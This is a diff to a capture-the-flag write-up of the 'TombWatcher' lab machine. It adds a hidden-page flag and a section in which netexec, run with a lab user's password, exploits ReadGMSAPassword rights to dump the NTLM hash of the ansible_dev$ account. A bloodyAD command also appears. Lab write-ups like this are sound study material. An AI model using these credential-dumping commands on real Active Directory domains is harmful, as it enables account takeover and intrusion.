@@ -1,3 +1,7 @@
+---
+hidden: true
+---
+
 # TombWatcher
 
 ## Machine Information
@@ -109,4 +113,10 @@ bloodyAD --host '10.10.11.72' -d 'TOMBWATCHER.HTB' -u 'Alfred' -p 'basketball' a
 ## ReadGMSAPassword rights&#x20;
 
 Always from bloodhound we notice that the group INFRASTRUCTURE has ReadGMSAPassword rights.
+
+```bash
+netexec ldap 10.10.11.72 -u Alfred -p 'basketball' --gmsa
+
+Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc
+```
 
